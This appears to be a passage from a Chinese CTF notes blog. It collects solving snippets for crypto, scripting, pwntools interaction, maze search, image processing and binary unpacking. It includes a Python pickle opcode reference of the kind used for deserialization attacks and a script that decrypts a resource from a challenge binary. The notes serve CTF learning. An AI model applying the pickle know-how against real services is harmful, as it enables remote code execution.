<li>ssh -p 25298 <a href="mailto:&#114;&#111;&#111;&#x74;&#64;&#x6e;&#111;&#100;&#x65;&#52;&#x2e;&#98;&#117;&#117;&#111;&#x6a;&#x2e;&#x63;&#110;">&#114;&#111;&#111;&#x74;&#64;&#x6e;&#111;&#100;&#x65;&#52;&#x2e;&#98;&#117;&#117;&#111;&#x6a;&#x2e;&#x63;&#110;</a></li>
</ul>
<p>更多ssh参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/li528405176/article/details/82810342">此处</a>。</p>
<h2 id="python-Crypto解密des密文"><a href="#python-Crypto解密des密文" class="headerlink" title="python Crypto解密des密文"></a>python Crypto解密des密文</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/181019#h3-15">题目及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">key = <span class="string">b&quot;t\x00e\x00s\x00t\x00&quot;</span></span><br><span class="line">des = DES.new(key, mode = DES.MODE_CBC, iv = key)</span><br><span class="line">a = <span class="string">b&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;</span></span><br><span class="line">a = base64.b64decode(a)</span><br><span class="line">res = des.decrypt(a)[<span class="number">0</span>:-<span class="number">6</span>].decode(<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h2 id="常见算法特征总结"><a href="#常见算法特征总结" class="headerlink" title="常见算法特征总结"></a>常见算法特征总结</h2><p><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/miscellaneous/suan-fa-te-zheng-zong-jie">链接</a></p>
<h2 id="GCC编译C文件为可执行文件"><a href="#GCC编译C文件为可执行文件" class="headerlink" title="GCC编译C文件为可执行文件"></a>GCC编译C文件为可执行文件</h2><ul>
<li>gcc source.c -o result.o</li>
</ul>
<h2 id="套娃压缩文件解压bash脚本"><a href="#套娃压缩文件解压bash脚本" class="headerlink" title="套娃压缩文件解压bash脚本"></a>套娃压缩文件解压bash脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/110051084">例题及来源</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot;</span> -gt 0 ]; <span class="keyword">do</span> find -<span class="built_in">type</span> f -name <span class="string">&quot;*.tar.xz&quot;</span> -<span class="built_in">exec</span> tar xf <span class="string">&#x27;&#123;&#125;&#x27;</span> \; -<span class="built_in">exec</span> <span class="built_in">rm</span> -- <span class="string">&#x27;&#123;&#125;&#x27;</span> \;; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Nim博弈pwntools交互"><a href="#Nim博弈pwntools交互" class="headerlink" title="Nim博弈pwntools交互"></a>Nim博弈pwntools交互</h2><p><a target="_blank" rel="noopener" href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#catnim">来源</a>。有关nim博弈可以参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/422562139">此处</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pile</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Now pile: &#x27;</span>)</span><br><span class="line">    line=p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="keyword">return</span> line.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_xor</span>(<span class="params">piles</span>):</span><br><span class="line">    v=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> piles:</span><br><span class="line">        v^=num</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;xor :&quot;</span>,v)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">piles</span>):</span><br><span class="line">    v=get_xor(piles)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> piles:</span><br><span class="line">        <span class="keyword">if</span> num-(num^v) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i,num-(num^v)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>,<span class="literal">None</span></span><br><span class="line">p=remote(<span class="string">&#x27;223.112.5.156&#x27;</span>,<span class="number">55068</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">start=time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    piles=get_pile()</span><br><span class="line">    pilesnum=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> piles]</span><br><span class="line">    where,cnt=choose(pilesnum)</span><br><span class="line">    <span class="built_in">print</span>(pilesnum)</span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> pilesnum:</span><br><span class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</span><br><span class="line">            s+=<span class="number">1</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;where:&#x27;</span>,<span class="built_in">str</span>(where))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;count:&#x27;</span>,<span class="built_in">str</span>(cnt))</span><br><span class="line">    <span class="keyword">if</span> s==<span class="built_in">len</span>(pilesnum)-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    piles=get_pile()</span><br><span class="line"><span class="built_in">print</span>(time.time()-start)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#print(pilesnum)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="路径编程问题"><a href="#路径编程问题" class="headerlink" title="路径编程问题"></a>路径编程问题</h2><p>从m点到 n 点走 k 步的<a target="_blank" rel="noopener" href="https://blog.csdn.net/bbbbswbq/article/details/81177945">路径条数问题</a>。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41956187/article/details/105731368">题目及来源</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod = <span class="number">10003</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[N][N];</span><br><span class="line">&#125;;</span><br><span class="line">node c, ans;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="function">node <span class="title">mul</span><span class="params">(node x, node y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node ans;</span><br><span class="line">    <span class="built_in">memset</span>(ans.a, <span class="number">0</span>, <span class="built_in">sizeof</span>(ans.a));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (x.a[i][k])</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.a[i][j] += x.a[i][k] * y.a[k][j];</span><br><span class="line">                    ans.a[i][j] %= mod;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">node <span class="title">Pow</span><span class="params">(node x, <span class="type">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node ans;</span><br><span class="line">    <span class="built_in">memset</span>(ans.a, <span class="number">0</span>, <span class="built_in">sizeof</span>(ans.a));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        ans.a[i][i] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (m &amp; <span class="number">1</span>)</span><br><span class="line">            ans = <span class="built_in">mul</span>(ans, x);</span><br><span class="line">        x = <span class="built_in">mul</span>(x, x);</span><br><span class="line">        m &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;yyh.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;out&quot;</span>,<span class="string">&quot;w&quot;</span>,stdout);</span><br><span class="line">    <span class="type">int</span> m, u, v, step;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;step);</span><br><span class="line">    <span class="built_in">memset</span>(c.a, <span class="number">0</span>, <span class="built_in">sizeof</span>(c.a));</span><br><span class="line">    <span class="keyword">while</span> (m--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        c.a[u][v] = c.a[v][u] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ans = <span class="built_in">Pow</span>(c, step);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans.a[<span class="number">1</span>][n]);</span><br><span class="line">    <span class="built_in">fclose</span>(stdin);</span><br><span class="line">    <span class="built_in">fclose</span>(stdout);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="python-pickle-opcodes参考"><a href="#python-pickle-opcodes参考" class="headerlink" title="python pickle opcodes参考"></a>python pickle opcodes参考</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">来源</a>。例题:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/90798308">[SUCTF 2019]Guess Game</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c：引入模块和对象，模块名和对象名以换行符分割</span><br><span class="line">&#125;：push一个空的字典，相当于push &#123;&#125;</span><br><span class="line">S: push一个字符串</span><br><span class="line">I: push一个整型</span><br><span class="line">s: pop两位 ，然后作为字典的key和value</span><br><span class="line">b: 调用__setstate__ 或者 __dict__.update()</span><br><span class="line">(：压入一个标志到栈中，表示元组的开始位置</span><br><span class="line">t：从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</span><br><span class="line">R：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</span><br><span class="line">p：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引</span><br><span class="line">V、S：向栈顶压入一个（unicode）字符串</span><br><span class="line">.：表示整个程序结束</span><br></pre></td></tr></table></figure>

<h2 id="python-bfs寻最长路径实现（走迷宫）"><a href="#python-bfs寻最长路径实现（走迷宫）" class="headerlink" title="python bfs寻最长路径实现（走迷宫）"></a>python bfs寻最长路径实现（走迷宫）</h2><p><a target="_blank" rel="noopener" href="https://github.com/ev0A/SCTF2019-Write-Up#maaaaaaze">原题</a>的路径在html的td标签中，所以还需要BeautifulSoup处理一下html</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#处理html部分</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Maze.html&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    html_doc = file.read()</span><br><span class="line">soup = BeautifulSoup(html_doc, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">lattice = soup.find_all(<span class="string">&#x27;td&#x27;</span>)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;border-([a-z]+):&#x27;</span>)</span><br><span class="line">maze = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    temp1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j * <span class="number">100</span>, j * <span class="number">100</span> + <span class="number">100</span>):</span><br><span class="line">        temp = <span class="string">&quot;&quot;</span></span><br><span class="line">        result = pattern.findall(<span class="built_in">str</span>(lattice[i]))</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;top&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            temp += <span class="string">&quot;u&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;bottom&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            temp += <span class="string">&quot;d&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;right&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            temp += <span class="string">&quot;r&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;left&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            temp += <span class="string">&quot;l&quot;</span></span><br><span class="line">        temp1.append(temp)</span><br><span class="line">    maze.append(temp1)</span><br><span class="line"><span class="comment">#bfs部分，参考Nu1l师傅的脚本，更加简洁</span></span><br><span class="line">move = &#123;<span class="string">&#x27;u&#x27;</span>: (-<span class="number">1</span>, <span class="number">0</span>), <span class="string">&#x27;d&#x27;</span>: (<span class="number">1</span>, <span class="number">0</span>), <span class="string">&#x27;l&#x27;</span>: (<span class="number">0</span>, -<span class="number">1</span>), <span class="string">&#x27;r&#x27;</span>: (<span class="number">0</span>, <span class="number">1</span>)&#125;</span><br><span class="line">queue = deque()</span><br><span class="line">queue.append(((<span class="number">0</span>, <span class="number">0</span>), <span class="number">0</span>))</span><br><span class="line">visited = []</span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line">ansv = ()</span><br><span class="line"><span class="keyword">while</span> queue:</span><br><span class="line">    v, res = queue.popleft()</span><br><span class="line">    <span class="keyword">if</span> res &gt; ans:</span><br><span class="line">        ans = res</span><br><span class="line">        ansv = v</span><br><span class="line">    <span class="keyword">if</span> v <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">        visited.append(v)</span><br><span class="line">        <span class="keyword">for</span> adj <span class="keyword">in</span> maze[v[<span class="number">0</span>]][v[<span class="number">1</span>]]:</span><br><span class="line">            queue.append(((v[<span class="number">0</span>] + move[adj][<span class="number">0</span>], v[<span class="number">1</span>] + move[adj][<span class="number">1</span>]), res + <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(ansv, ans)</span><br></pre></td></tr></table></figure>

<p>假如迷宫是png形式： <a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#so_long">https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#so_long</a> 。<a target="_blank" rel="noopener" href="https://github.com/AkaSec-1337-CyberSecurity-Club/Akasec-CTF-2024/tree/main/misc/so_long">官方脚本</a>可能更好</p>
<h2 id="PIL遍历图片的rgb值并打印"><a href="#PIL遍历图片的rgb值并打印" class="headerlink" title="PIL遍历图片的rgb值并打印"></a>PIL遍历图片的rgb值并打印</h2><p><a target="_blank" rel="noopener" href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;Chall.png&#x27;</span>)</span><br><span class="line">pix = img.load()</span><br><span class="line">w, h = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        r,g,b,a = img.getpixel((i,c))</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">255</span> <span class="keyword">and</span> g == <span class="number">255</span> <span class="keyword">and</span> b == <span class="number">255</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(r,g,b,a)</span><br></pre></td></tr></table></figure>

<h2 id="PIL-numpy-cv2处理带有图片像素值的txt"><a href="#PIL-numpy-cv2处理带有图片像素值的txt" class="headerlink" title="PIL+numpy+cv2处理带有图片像素值的txt"></a>PIL+numpy+cv2处理带有图片像素值的txt</h2><p><a target="_blank" rel="noopener" href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="keyword">as</span> im</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;weirdoooo.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">data2 = []</span><br><span class="line"><span class="comment"># create empty img 1024*1024</span></span><br><span class="line">img = np.zeros((<span class="number">1024</span>,<span class="number">1024</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data2.append(data[i].split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data2[i])):</span><br><span class="line">        <span class="keyword">if</span>  data2[i][j] == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img[i][j]=data2[i][j]</span><br><span class="line"><span class="built_in">print</span>(img.shape)</span><br><span class="line">out=img.astype(np.uint8) <span class="comment">#数值类型转换， https://numpy.org/doc/stable/reference/generated/numpy.ndarray.astype.html</span></span><br><span class="line">out = im.fromarray(out) <span class="comment">#从数组转为图片， https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.fromarray</span></span><br><span class="line"><span class="comment">#out.convert()</span></span><br><span class="line">out.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">flag = cv2.imread(<span class="string">&#x27;flag.png&#x27;</span>) <span class="comment">#opencv的参考https://www.geeksforgeeks.org/python-opencv-cv2-imread-method/</span></span><br><span class="line">cv2.imshow(<span class="string">&#x27;flag&#x27;</span>,flag)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="使用pefile库读取pefile文件内容并修改"><a href="#使用pefile库读取pefile文件内容并修改" class="headerlink" title="使用pefile库读取pefile文件内容并修改"></a>使用pefile库读取pefile文件内容并修改</h2><p><a target="_blank" rel="noopener" href="https://gist.github.com/matthw/4ce2a4b9e76eb7008d55661e4792f463">来源</a>。这道题的题目文件加密了重要的检查逻辑文件，且不是直接写的pe文件，还往里面加了没用的数据。直接用pefile读取有效的数据改回来就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line">pe = pefile.PE(<span class="string">&quot;evil.exe&quot;</span>)</span><br><span class="line">key = <span class="string">b&#x27;PHALAN&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_resource</span>(<span class="params">pe</span>):</span><br><span class="line">    <span class="keyword">for</span> rsrc_type <span class="keyword">in</span> pe.DIRECTORY_ENTRY_RESOURCE.entries:</span><br><span class="line">        <span class="keyword">for</span> rsrc <span class="keyword">in</span> rsrc_type.directory.entries:</span><br><span class="line">            rsrc = rsrc.directory.entries[<span class="number">0</span>].data.struct</span><br><span class="line">            <span class="keyword">return</span> pe.get_data(rsrc.OffsetToData, rsrc.Size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    out = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">for</span> n, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        <span class="keyword">if</span> data[n] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> data[n] == key[n % <span class="built_in">len</span>(key)]:</span><br><span class="line">            out[n] = data[n]</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        out[n] = data[n] ^ key[n % <span class="built_in">len</span>(key)]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">data = get_resource(pe)</span><br><span class="line"></span><br><span class="line">yo = decrypt(data, key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dumped.pe&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(yo)</span><br></pre></td></tr></table></figure>

<h2 id="python-networkx模块使用"><a href="#python-networkx模块使用" class="headerlink" title="python networkx模块使用"></a>python networkx模块使用</h2><h1 id="最大权重配对问题（maximum-weight-matching）"><a href="#最大权重配对问题（maximum-weight-matching）" class="headerlink" title="最大权重配对问题（maximum weight matching）"></a>最大权重配对问题（maximum weight matching）</h1><p><a target="_blank" rel="noopener" href="https://enscribe.dev/ctfs/mhs/prog/matchmaker/">例题及来源</a>，涉及到基本的图论（graph theory）和开花算法（The Blossom Algorithm）。</p>
